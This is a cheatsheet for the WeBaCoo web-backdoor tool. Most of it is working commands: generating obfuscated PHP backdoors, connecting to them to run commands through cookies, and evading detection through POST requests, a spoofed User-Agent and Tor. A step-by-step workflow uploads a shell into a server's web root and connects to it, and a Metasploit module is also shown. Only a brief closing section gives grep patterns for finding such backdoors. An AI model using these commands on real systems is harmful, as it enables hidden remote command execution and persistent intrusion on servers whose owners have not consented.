---
title: "WeBaCoo Cheatsheet"
tool: "WeBaCoo"
version: "0.2.3"
date: "2026-07-18"
---

# WeBaCoo Cheatsheet

## Generate Backdoor

```bash
# Default obfuscated backdoor (system function)
webacoo -g -o backdoor.php

# Using shell_exec instead of system
webacoo -g -f 2 -o stealth.php

# Using passthru (for binary output)
webacoo -g -f 4 -o binary.php

# Un-obfuscated for debugging
webacoo -g -o raw.php -r

# All function options
# -f 1: system (default)
# -f 2: shell_exec
# -f 3: exec
# -f 4: passthru
# -f 5: popen
```

## Connect to Backdoor

```bash
# Basic connection
webacoo -t -u http://192.168.1.50/backdoor.php

# Single command
webacoo -t -e "whoami" -u http://192.168.1.50/backdoor.php

# With custom cookie name
webacoo -t -u http://target.example.com/backdoor.php -c "PHPSESSID"

# With custom delimiter
webacoo -t -u http://target.example.com/backdoor.php -d "||"
```

## Stealth Options

```bash
# POST method (avoids access log params)
webacoo -t -u http://target.example.com/backdoor.php -m POST

# Custom User-Agent
webacoo -t -u http://target.example.com/backdoor.php \
  -a "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"

# Through Tor
webacoo -t -u http://target.example.com/backdoor.php -p tor

# Through local proxy (Burp Suite)
webacoo -t -u http://target.example.com/backdoor.php -p 127.0.0.1:8080

# Through authenticated proxy
webacoo -t -u http://target.example.com/backdoor.php -p user:pass:10.0.1.8:3128
```

## Verbose and Logging

```bash
# Verbosity levels
webacoo -t -u http://target.example.com/backdoor.php -v 0  # quiet (default)
webacoo -t -u http://target.example.com/backdoor.php -v 1  # HTTP headers
webacoo -t -u http://target.example.com/backdoor.php -v 2  # headers + data

# Log activity to file
webacoo -t -u http://target.example.com/backdoor.php -l /tmp/webacoo.log
```

## Extension Modules

```text
# In interactive terminal mode:
load            # List and initialize extension modules
unload          # Restore to initial terminal mode

# Available modules:
# mysql-cli      - MySQL command line
# psql-cli       - PostgreSQL command line
# upload         - File upload via HTTP POST
# download       - File download via od/xxd encoding
# stealth        - .htaccess handling for evasion
```

## Metasploit Integration

```bash
msfconsole
use exploit/multi/http/webacoo_exec
set RHOSTS 192.168.1.50
set TARGETURI /shell.php
exploit
```

## Deployment Workflow

```bash
# 1. Generate
webacoo -g -f 2 -o /tmp/shell.php

# 2. Upload
scp /tmp/shell.php user@192.168.1.50:/var/www/html/uploads/shell.php

# 3. Verify
curl -I http://192.168.1.50/uploads/shell.php

# 4. Connect
webacoo -t -u http://192.168.1.50/uploads/shell.php -c "PHPSESSID" -m POST

# 5. Cleanup after engagement
ssh user@192.168.1.50 "rm /var/www/html/uploads/shell.php"
```

## Quick Reference

| Flag | Purpose | Example |
|------|---------|---------|
| `-g` | Generate backdoor | `-g -o shell.php` |
| `-f` | PHP function (1-5) | `-f 2` |
| `-o` | Output filename | `-o shell.php` |
| `-r` | Raw/un-obfuscated | `-r` |
| `-t` | Terminal mode | `-t` |
| `-u` | Backdoor URL | `-u http://target/shell.php` |
| `-e` | Single command | `-e "id"` |
| `-m` | HTTP method | `-m POST` |
| `-c` | Cookie name | `-c "PHPSESSID"` |
| `-d` | Delimiter | `-d "\|\|"` |
| `-a` | User-Agent | `-a "Mozilla/5.0..."` |
| `-p` | Proxy | `-p tor` or `-p ip:port` |
| `-v` | Verbosity (0-2) | `-v 2` |
| `-l` | Log file | `-l /tmp/log.txt` |

## Dependencies

```bash
# Debian/Kali
sudo apt install webacoo

# Manual
perl -v              # Perl interpreter
cpan URI             # liburi-perl
cpan IO::Socket::SOCKS  # Tor support (optional)
```

## Detection Patterns

```bash
# Search for WeBaCoo artifacts
grep -rn "M-cookie\|base64_decode\|gzinflate" /var/www/ --include="*.php"
find /var/www -name "*.php" -size -2k
```
